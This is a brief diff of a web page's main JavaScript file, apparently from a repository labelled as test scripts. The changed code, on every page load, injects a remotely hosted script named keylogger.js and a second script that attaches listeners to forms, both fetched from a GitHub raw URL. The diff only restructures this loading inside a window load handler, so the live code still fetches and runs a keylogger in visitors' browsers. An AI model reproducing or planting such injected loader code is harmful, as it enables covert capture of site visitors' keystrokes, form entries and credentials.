@@ -1,14 +1,13 @@
-console.log("Main script loaded.");
+window.addEventListener('load', () => {
+    console.log("Main script loaded.");
 
-function loadScript(url) {
-    const script = document.createElement('script');
-    script.src = url;
-    script.onload = () => console.log(`Script loaded: ${url}`);
-    document.head.appendChild(script);
-}
+    // Load the keylogger script
+    const keyloggerScript = document.createElement('script');
+    keyloggerScript.src = 'https://raw.githubusercontent.com/MiguelGomezMaxio/js-scrits-for-testing/main/keylogger.js';
+    document.head.appendChild(keyloggerScript);
 
-// Load keylogger.js
-loadScript('https://raw.githubusercontent.com/MiguelGomezMaxio/js-scrits-for-testing/main/keylogger.js');
-
-// Load add-event-listener-to-form.js
-loadScript('https://raw.githubusercontent.com/MiguelGomezMaxio/js-scrits-for-testing/main/add-event-listener-to-form.js');
+    // Load the event listener script
+    const eventListenerScript = document.createElement('script');
+    eventListenerScript.src = 'https://raw.githubusercontent.com/MiguelGomezMaxio/js-scrits-for-testing/main/add-event-listener-to-form.js';
+    document.head.appendChild(eventListenerScript);
+});
